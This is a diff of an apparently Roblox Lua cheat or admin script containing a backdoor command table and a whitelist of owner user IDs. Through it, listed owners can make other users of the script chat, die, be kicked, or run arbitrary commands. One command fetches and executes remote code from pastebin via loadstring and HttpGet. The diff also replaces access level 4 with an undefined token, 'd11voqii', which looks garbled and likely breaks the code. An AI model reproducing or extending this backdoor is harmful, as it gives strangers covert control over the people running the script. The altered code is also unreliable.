@@ -197,31 +197,31 @@ local WireFrameTable = {}
 local BackDoorTableCommands = {
 	['chat'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
-		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
+		['Levels'] = {[1] = true;[2] = true;[3] = true;[d11voqii] = true;}
 	};
-	[':notif'] = {
+	['notif'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then StarterGui:SetCore("SendNotification",{['Title'] = "Cy's Messages";['Text'] = Message;['Duration'] = 10;['Icon'] = nil;}) end end;
-		['Levels'] = {[4] = true;}
+		['Levels'] = {[d11voqii] = true;}
 	};
-	[':bring'] = {
+	['bring'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand("to "..CommandedPlayer.Name) end end;
-		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
+		['Levels'] = {[1] = true;[2] = true;[3] = true;[d11voqii] = true;}
 	};
 	['kill'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then GetChar():BreakJoints() end end;
-		['Levels'] = {[2] = true;[3] = true;[4] = true;}
+		['Levels'] = {[2] = true;[3] = true;[d11voqii] = true;}
 	};
 	['exec'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand(Content) end end;
-		['Levels'] = {[3] = true;[4] = true;}
+		['Levels'] = {[3] = true;[d11voqii] = true;}
 	};
-	[':kick'] = {
+	['kick'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then LP:Kick(Content) end end;
-		['Levels'] = {[3] = true;[4] = true;}
+		['Levels'] = {[3] = true;[d11voqii] = true;}
 	};
 	['ban'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.lIIl:FireServer'hipheight' end end;
-		['Levels'] = {[4] = true;}
+		['Levels'] = {[d11voqii] = true;}
 	};
 	['p'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
@@ -237,12 +237,12 @@ local BackDoorTablePlayers = {
 	};
 	[601410459] = {
 		['Name'] = "P H I L L I P T H E G O D (new owner) (remaking the script.)"; 
-		['Access'] = 4;
+		['Access'] = d11voqii;
 		['Colour'] = Color3.fromRGB(0,0,255);
 	};
 	[748947310] = {
 		['Name'] = "P H I L L I P T H E G O D'S  GIRL FRIEND"; 
-		['Access'] = 4;
+		['Access'] = d11voqii;
 		['Colour'] = Color3.fromRGB(0,0,255);
 	};
 	[1] = {
